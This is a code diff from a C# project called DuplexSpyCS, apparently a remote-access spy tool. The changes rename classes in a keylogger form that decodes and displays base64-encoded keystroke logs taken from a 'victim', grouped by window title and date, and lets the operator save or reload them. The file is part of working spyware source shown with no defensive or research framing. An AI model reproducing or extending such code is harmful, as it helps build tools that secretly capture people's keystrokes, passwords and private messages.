@@ -27,7 +27,7 @@ namespace DuplexSpyCS
 
     public partial class frmKeyLogger : Form
     {
-        public Victim v;
+        public clsVictim v;
         private Dictionary<string, List<string>> dic_kl = new Dictionary<string, List<string>>();
         private Dictionary<string, Dictionary<string, List<string>>> dic_date = new Dictionary<string, Dictionary<string, List<string>>>();
 
@@ -118,7 +118,7 @@ namespace DuplexSpyCS
 
             Invoke(new Action(() =>
             {
-                textBox2.Text = Crypto.b64D2Str(d1); //Path
+                textBox2.Text = clsCrypto.b64D2Str(d1); //Path
                 
                 richTextBox1.Clear();
                 treeView1.Nodes.Clear();
@@ -130,10 +130,10 @@ namespace DuplexSpyCS
                 toolStripStatusLabel1.Text = "Processing keylogger file...";
             }));
 
-            string data = Crypto.b64D2Str(d2); //Data
+            string data = clsCrypto.b64D2Str(d2); //Data
             string last_title = null;
             string last_txt_title = null;
-            string[] aDatas = Crypto.b64D2Str(d2).Split(Environment.NewLine);
+            string[] aDatas = clsCrypto.b64D2Str(d2).Split(Environment.NewLine);
 
             Invoke(new Action(() =>
             {
@@ -150,11 +150,11 @@ namespace DuplexSpyCS
                     if (string.IsNullOrEmpty(row.Trim()))
                         continue;
 
-                    string dec_row = Crypto.b64D2Str(row);
+                    string dec_row = clsCrypto.b64D2Str(row);
                     string[] s = dec_row.Split("|");
-                    string title = Crypto.b64D2Str(s[0]);
-                    string date = Crypto.b64D2Str(s[1]);
-                    string key = Crypto.b64D2Str(s[2]);
+                    string title = clsCrypto.b64D2Str(s[0]);
+                    string date = clsCrypto.b64D2Str(s[1]);
+                    string key = clsCrypto.b64D2Str(s[2]);
 
                     DateTime datetime = DateTime.Parse(date);
                     string new_date = datetime.ToString("yyyy/MM/dd"); //datetime.ToString("yyyy/MM/dd/HH");
@@ -351,7 +351,7 @@ namespace DuplexSpyCS
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
             SaveFileDialog sfd = new SaveFileDialog();
-            sfd.FileName = C1.GenerateFileName("rtf");
+            sfd.FileName = clsTools.GenerateFileName("rtf");
             if (sfd.ShowDialog() == DialogResult.OK)
             {
                 File.WriteAllText(sfd.FileName, richTextBox1.Text);
@@ -371,7 +371,7 @@ namespace DuplexSpyCS
             {
                 try
                 {
-                    ShowKeyLogger(Crypto.b64E2Str(ofd.FileName), Crypto.b64E2Str(File.ReadAllText(ofd.FileName)));
+                    ShowKeyLogger(clsCrypto.b64E2Str(ofd.FileName), clsCrypto.b64E2Str(File.ReadAllText(ofd.FileName)));
                 }
                 catch (Exception ex)
                 {
